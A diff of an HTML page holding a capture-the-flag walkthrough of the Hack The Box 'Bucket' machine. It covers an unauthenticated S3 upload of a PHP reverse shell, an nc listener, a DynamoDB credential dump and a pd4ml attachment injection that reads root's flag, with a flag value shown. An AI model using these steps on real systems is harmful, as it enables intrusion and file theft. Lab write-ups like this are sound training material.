@@ -65,7 +65,7 @@
                 <p class="uk-article-lead" itemprop="description">Solution to the Bucket VM</p>
                 <section itemprop="articleBody"><h1>Foothold</h1>
 <p>First, as always we scan ports with <em>nmap</em>.</p>
-<div class="highlight"><pre><span></span>nmap -sS -sV  <span class="m">10</span>.10.10.212  
+<div class="highlight"><pre><span></span><code>nmap -sS -sV  <span class="m">10</span>.10.10.212  
 Starting Nmap <span class="m">7</span>.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2021</span>-05-16 <span class="m">23</span>:27 CEST
 Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.212
 Host is up <span class="o">(</span><span class="m">0</span>.038s latency<span class="o">)</span>.
@@ -76,16 +76,14 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: <span class="m">127</span>.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">8</span>.03 seconds
-</pre></div>
-
+</code></pre></div>
 
 <p>There is something on port 80, so lets check:</p>
-<div class="highlight"><pre><span></span>curl <span class="m">10</span>.10.10.212
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl <span class="m">10</span>.10.10.212
+</code></pre></div>
 
 <p>Result: </p>
-<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span>
 <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>302 Found<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
@@ -94,129 +92,110 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">address</span><span class="p">&gt;</span>Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80<span class="p">&lt;/</span><span class="nt">address</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>So we have to map this host name with the ip address:</p>
-<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</code></pre></div>
 
 <p>Now it start to work, but while looking through source code of recived page, we can see images urls, that are not opened correcly, like: http://s3.bucket.htb/adserver/images/bug.jpg</p>
 <p>So we can add another line to our <strong>hosts</strong> file</p>
-<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 s3.bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 s3.bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</code></pre></div>
 
 <p>Great, the page is looking good right now. But the interesting part is the <strong>s3</strong> suffix, as it sounds like a local instance of the famous Amazon Simple Storage Service. And the title of this machine confirms out assumption! So... let's have some fun with it.</p>
-<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/images/&quot;</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/images/&quot;</span>
+</code></pre></div>
 
 <p>Result:</p>
-<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
 <span class="nt">&lt;Error&gt;</span>
     <span class="nt">&lt;Code&gt;</span>NoSuchKey<span class="nt">&lt;/Code&gt;</span>
     <span class="nt">&lt;Message&gt;</span>The specified key does not exist.<span class="nt">&lt;/Message&gt;</span>
 
     <span class="nt">&lt;RequestID&gt;</span>7a62c49f-347e-4fc4-9331-6e8eEXAMPLE<span class="nt">&lt;/RequestID&gt;</span>
 <span class="nt">&lt;/Error&gt;</span>
-</pre></div>
+</code></pre></div>
 
-
-<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/&quot;</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/&quot;</span>
+</code></pre></div>
 
 <p>Result:</p>
-<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
+</code></pre></div>
 
-
-<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/&quot;</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl <span class="s2">&quot;http://s3.bucket.htb/&quot;</span>
+</code></pre></div>
 
 <p>Result:</p>
-<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
+</code></pre></div>
 
 <p>We can see different responses, so it looks promissing!</p>
 <p>As it look like a s3 instance, we can try to use it like it, either by working with pure requests:</p>
-<div class="highlight"><pre><span></span>curl -X PUT http://s3.bucket.htb/adserver/ -T reverse-shell.php
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl -X PUT http://s3.bucket.htb/adserver/ -T reverse-shell.php
+</code></pre></div>
 
 <p>That looks like a pure luck, but it is really working... But we can try something more. Why not use some FUZZ?</p>
-<div class="highlight"><pre><span></span>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc <span class="m">404</span> http://s3.bucket.htb/FUZZ/foo/
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc <span class="m">404</span> http://s3.bucket.htb/FUZZ/foo/
+</code></pre></div>
 
 <p>And hey, what we have here?!</p>
-<div class="highlight"><pre><span></span>=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                   
-=====================================================================
+<div class="highlight"><pre><span></span><code><span class="o">=====================================================================</span>
+<span class="n">ID</span>           <span class="n">Response</span>   <span class="n">Lines</span>    <span class="n">Word</span>       <span class="n">Chars</span>       <span class="n">Payload</span>                                                                                   
+<span class="o">=====================================================================</span>
 
 
-000001688:   500        0 L      13 W       158 Ch      &quot;shell&quot;                                                                                   
-</pre></div>
-
+<span class="mi">000001688</span><span class="p">:</span>   <span class="mi">500</span>        <span class="mi">0</span> <span class="n">L</span>      <span class="mi">13</span> <span class="n">W</span>       <span class="mi">158</span> <span class="n">Ch</span>      <span class="s2">&quot;shell&quot;</span>                                                                                   
+</code></pre></div>
 
 <p>Lets take a look at this address:</p>
 <p><img alt="DynamoDB web client screenshot" src="images/htb-bucket/htb-bucket.png"></p>
 <p>We are definitly going somewhere. For now just note that discovery.</p>
 <p>For now we can try last, but most important thing: use the <strong>aws</strong> cli. It is already on your system or just install it from system repo.</p>
 <p>Now the param <strong>--endpoint-url</strong> will be crucial. Lets try:</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
+</code></pre></div>
 
 <p>Nope, one more step is missing:</p>
-<div class="highlight"><pre><span></span>aws configure
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws configure
+</code></pre></div>
 
 <p>But we don't have any legit credentials. What can we do? Oh, well, just type anything in there. Any random stuff. And it works, jeeez!</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
                            PRE images/
 <span class="m">2021</span>-06-26 <span class="m">23</span>:58:04       <span class="m">5344</span> index.html
-</pre></div>
-
+</code></pre></div>
 
 <p>So prepare your pretty php reverse shell and copy it on the server, hoping it will work.</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver/
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver/
+</code></pre></div>
 
 <p>Now we can try to execute it:</p>
-<div class="highlight"><pre><span></span>nc -lvnp <span class="m">4321</span> <span class="c1"># in one term</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">4321</span> <span class="c1"># in one term</span>
+</code></pre></div>
 
 <p>Next that below in another:</p>
-<div class="highlight"><pre><span></span>curl http://bucket.htb/php-reverse-shell.php
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl http://bucket.htb/php-reverse-shell.php
+</code></pre></div>
 
 <p>Then what we see on the <strong>nc</strong> awaiting for connection?</p>
-<div class="highlight"><pre><span></span><span class="nt">listening</span> <span class="nt">on</span> <span class="cp">[</span><span class="nb">any</span><span class="cp">]</span> <span class="nt">4321</span> <span class="o">...</span>
-<span class="nt">connect</span> <span class="nt">to</span> <span class="cp">[</span><span class="mf">10.10.14.11</span><span class="cp">]</span> <span class="nt">from</span> <span class="o">(</span><span class="nt">UNKNOWN</span><span class="o">)</span> <span class="cp">[</span><span class="mf">10.10.10.212</span><span class="cp">]</span> <span class="nt">54924</span>
-<span class="nt">Linux</span> <span class="nt">bucket</span> <span class="nt">5</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">0-48-generic</span> <span class="p">#</span><span class="nn">52-Ubuntu</span> <span class="nt">SMP</span> <span class="nt">Thu</span> <span class="nt">Sep</span> <span class="nt">10</span> <span class="nt">10</span><span class="p">:</span><span class="nd">58</span><span class="p">:</span><span class="nd">49</span> <span class="nt">UTC</span> <span class="nt">2020</span> <span class="nt">x86_64</span> <span class="nt">x86_64</span> <span class="nt">x86_64</span> <span class="nt">GNU</span><span class="o">/</span><span class="nt">Linux</span>
- <span class="nt">22</span><span class="p">:</span><span class="nd">03</span><span class="p">:</span><span class="nd">15</span> <span class="nt">up</span>  <span class="nt">3</span><span class="p">:</span><span class="nd">08</span><span class="o">,</span>  <span class="nt">1</span> <span class="nt">user</span><span class="o">,</span>  <span class="nt">load</span> <span class="nt">average</span><span class="o">:</span> <span class="nt">0</span><span class="p">.</span><span class="nc">01</span><span class="o">,</span> <span class="nt">0</span><span class="p">.</span><span class="nc">20</span><span class="o">,</span> <span class="nt">0</span><span class="p">.</span><span class="nc">25</span>
-<span class="nt">USER</span>     <span class="nt">TTY</span>      <span class="nt">FROM</span>             <span class="nt">LOGIN</span><span class="o">@</span>   <span class="nt">IDLE</span>   <span class="nt">JCPU</span>   <span class="nt">PCPU</span> <span class="nt">WHAT</span>
-<span class="nt">roy</span>      <span class="nt">pts</span><span class="o">/</span><span class="nt">1</span>    <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">11</span>      <span class="nt">18</span><span class="p">:</span><span class="nd">59</span>   <span class="nt">56</span><span class="p">.</span><span class="nc">00s</span>  <span class="nt">0</span><span class="p">.</span><span class="nc">44s</span>  <span class="nt">0</span><span class="p">.</span><span class="nc">44s</span> <span class="nt">-bash</span>
-<span class="nt">uid</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">gid</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">groups</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span>
-<span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span><span class="o">:</span> <span class="nt">0</span><span class="o">:</span> <span class="nt">can</span><span class="err">&#39;</span><span class="nt">t</span> <span class="nt">access</span> <span class="nt">tty</span><span class="o">;</span> <span class="nt">job</span> <span class="nt">control</span> <span class="nt">turned</span> <span class="nt">off</span>
-<span class="o">$</span> 
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">4321</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.11</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.212</span><span class="o">]</span><span class="w"> </span><span class="mi">54924</span><span class="w"></span>
+<span class="n">Linux</span><span class="w"> </span><span class="n">bucket</span><span class="w"> </span><span class="mf">5.4.0</span><span class="o">-</span><span class="mi">48</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="n">#52</span><span class="o">-</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">SMP</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">58</span><span class="err">:</span><span class="mi">49</span><span class="w"> </span><span class="n">UTC</span><span class="w"> </span><span class="mi">2020</span><span class="w"> </span><span class="n">x86_64</span><span class="w"> </span><span class="n">x86_64</span><span class="w"> </span><span class="n">x86_64</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"></span>
+<span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">03</span><span class="err">:</span><span class="mi">15</span><span class="w"> </span><span class="n">up</span><span class="w">  </span><span class="mi">3</span><span class="err">:</span><span class="mi">08</span><span class="p">,</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w">  </span><span class="k">load</span><span class="w"> </span><span class="nl">average</span><span class="p">:</span><span class="w"> </span><span class="mf">0.01</span><span class="p">,</span><span class="w"> </span><span class="mf">0.20</span><span class="p">,</span><span class="w"> </span><span class="mf">0.25</span><span class="w"></span>
+<span class="k">USER</span><span class="w">     </span><span class="n">TTY</span><span class="w">      </span><span class="k">FROM</span><span class="w">             </span><span class="n">LOGIN</span><span class="err">@</span><span class="w">   </span><span class="n">IDLE</span><span class="w">   </span><span class="n">JCPU</span><span class="w">   </span><span class="n">PCPU</span><span class="w"> </span><span class="n">WHAT</span><span class="w"></span>
+<span class="n">roy</span><span class="w">      </span><span class="n">pts</span><span class="o">/</span><span class="mi">1</span><span class="w">    </span><span class="mf">10.10.14.11</span><span class="w">      </span><span class="mi">18</span><span class="err">:</span><span class="mi">59</span><span class="w">   </span><span class="mf">56.00</span><span class="n">s</span><span class="w">  </span><span class="mf">0.44</span><span class="n">s</span><span class="w">  </span><span class="mf">0.44</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">bash</span><span class="w"></span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="p">)</span><span class="w"></span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nl">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="err">:</span><span class="w"> </span><span class="n">can</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">tty</span><span class="p">;</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="n">turned</span><span class="w"> </span><span class="k">off</span><span class="w"></span>
+<span class="err">$</span><span class="w"> </span>
+</code></pre></div>
 
 <p>BOOM, we are inside!</p>
 <h1>User</h1>
 <p>Escalating privileges in this case is quite simple, but we have to combine something new to find, with some foothold info. And with some luck, if it was a real life scenario.</p>
 <p>Of course it is recomended to start some enumaration scripts in this moment. Like <em>LinEnum</em> or <em>linpeas</em> and I encourage you to do it. But lets jump straight to the solution.</p>
-<div class="highlight"><pre><span></span>$ <span class="nb">cd</span> /home
+<div class="highlight"><pre><span></span><code>$ <span class="nb">cd</span> /home
 $ ls
 roy
 $ <span class="nb">cd</span> roy
@@ -225,29 +204,25 @@ project
 user.txt
 $ cat user.txt
 cat: user.txt: Permission denied
-</pre></div>
-
+</code></pre></div>
 
 <p>That give us at least the user name: <em>roy</em>. Great, but what about the password. Lets step back, to the foothold. We know about the dynamodb service, and we probably have access to id. Why not try to dive in it?</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb list-tables
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb list-tables
+</code></pre></div>
 
 <p>Result:</p>
-<div class="highlight"><pre><span></span><span class="p">{</span>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
     <span class="nt">&quot;TableNames&quot;</span><span class="p">:</span> <span class="p">[</span>
         <span class="s2">&quot;users&quot;</span>
     <span class="p">]</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
-
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb scan --table-name users
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb scan --table-name users
+</code></pre></div>
 
 <p>Result:</p>
-<div class="highlight"><pre><span></span><span class="p">{</span>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
     <span class="nt">&quot;Items&quot;</span><span class="p">:</span> <span class="p">[</span>
         <span class="p">{</span>
             <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
@@ -278,11 +253,10 @@ cat: user.txt: Permission denied
     <span class="nt">&quot;ScannedCount&quot;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
     <span class="nt">&quot;ConsumedCapacity&quot;</span><span class="p">:</span> <span class="kc">null</span>
 <span class="p">}</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>We have found three passwords to try. And guess what: we can use the third one to log in through <em>ssh</em> to <em>roy's</em> account!</p>
-<div class="highlight"><pre><span></span>ssh roy@10.10.10.212
+<div class="highlight"><pre><span></span><code>ssh roy@10.10.10.212
 Welcome to Ubuntu <span class="m">20</span>.04 LTS <span class="o">(</span>GNU/Linux <span class="m">5</span>.4.0-48-generic x86_64<span class="o">)</span>
 
  * Documentation:  https://help.ubuntu.com
@@ -318,12 +292,11 @@ roy@bucket:~$ ls
 project  user.txt
 roy@bucket:~$ cat user.txt 
 1845bbd4c30469474a3f5d2be1a32922
-</pre></div>
-
+</code></pre></div>
 
 <p>As we have the user flag, lets jump into the final part.</p>
 <h1>Root</h1>
-<div class="highlight"><pre><span></span>roy@bucket:~$ <span class="nb">cd</span> /var/www/
+<div class="highlight"><pre><span></span><code>roy@bucket:~$ <span class="nb">cd</span> /var/www/
 roy@bucket:/var/www$ ls -l
 total <span class="m">8</span>
 drwxr-x---+ <span class="m">4</span> root root <span class="m">4096</span> Feb <span class="m">10</span> <span class="m">12</span>:29 bucket-app
@@ -361,74 +334,64 @@ use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<
 <span class="k">else</span>
 <span class="o">{</span>
 ?&gt;
-</pre></div>
-
+</code></pre></div>
 
 <p>Looks promissing, but will it be enough? To escalate to root we need to take controll over a process running with root privileges. We will take a look at the apache config:</p>
-<div class="highlight"><pre><span></span>roy@bucket:/var/www/bucket-app$ head /etc/apache2/sites-available/000-default.conf 
+<div class="highlight"><pre><span></span><code>roy@bucket:/var/www/bucket-app$ head /etc/apache2/sites-available/000-default.conf 
 &lt;VirtualHost <span class="m">127</span>.0.0.1:8000&gt;
         &lt;IfModule mpm_itk_module&gt;
                 AssignUserId root root
         &lt;/IfModule&gt;
         DocumentRoot /var/www/bucket-app
 &lt;/VirtualHost&gt;
-</pre></div>
-
+</code></pre></div>
 
 <p>God bless the man who did it. And forbid him.</p>
 <p>Now we need to read carefully what we have above in the <strong>index.php</strong> file.</p>
 <p>There is a script, that is executed by a certain request from the vulnerable machine:</p>
-<div class="highlight"><pre><span></span>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm /tmp/hack/* <span class="p">;</span> cp * /tmp/unc
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm /tmp/hack/* <span class="p">;</span> cp * /tmp/unc
+</code></pre></div>
 
 <p>But to do anything we have to insert something to <em>alerts</em> table in dynamodb with the title of <em>Ransomware</em>. We have seen before, that there is no such table as <em>alerts</em>, so we have first to create it:</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span>
+</code></pre></div>
 
 <p>then we will be able to inject out exploit:</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;EXPLOIT PLACEHOLDER&quot;} } &#39;</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;EXPLOIT PLACEHOLDER&quot;} } &#39;</span>
+</code></pre></div>
 
 <p>But wait, do we have one? Sure, take a look at the line: </p>
-<div class="highlight"><pre><span></span><span class="x">passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="x">passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.</span>
+</code></pre></div>
 
 <p>it is our key to the kingdom. Google <em>pd4ml vulnerabilities</em> to find this awesome article: https://infosecwriteups.com/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd about <em>pd4ml:attachment</em> tag, that we can use here. </p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
+</code></pre></div>
 
 <p>Finding a perfect syntax to send to the db is a bit of a pain. The <em>description</em> attribute seems to be mandatory, but -- thanks God -- brackets around the arguments values aren't, which makes it a bit easier to read, cause we don't need to escape it.</p>
 <p>There is one more problem. There is a cront task, that is clearing the database and the <em>/var/www/bucket-app/files</em> directory every few minutes. So we have to be fast. Or smart. Fast and smart.</p>
 <p>We have to execute this oneliner on our machine:</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span><span class="p">;</span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span><span class="p">;</span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
+</code></pre></div>
 
 <p>and after that this one on the vulnerable one:</p>
-<div class="highlight"><pre><span></span>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm -r /tmp/hack <span class="p">;</span> mkdir -p /tmp/hack <span class="p">;</span> cp /var/www/bucket-app/files/* /tmp/hack <span class="p">;</span> cat /tmp/hack/result.pdf
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm -r /tmp/hack <span class="p">;</span> mkdir -p /tmp/hack <span class="p">;</span> cp /var/www/bucket-app/files/* /tmp/hack <span class="p">;</span> cat /tmp/hack/result.pdf
+</code></pre></div>
 
 <p>Thats the speed of light, babe! Inside the pdf content we can see this part:</p>
-<div class="highlight"><pre><span></span>/Type /EmbeddedFile
-/Length 33
-/Params 5 0 R
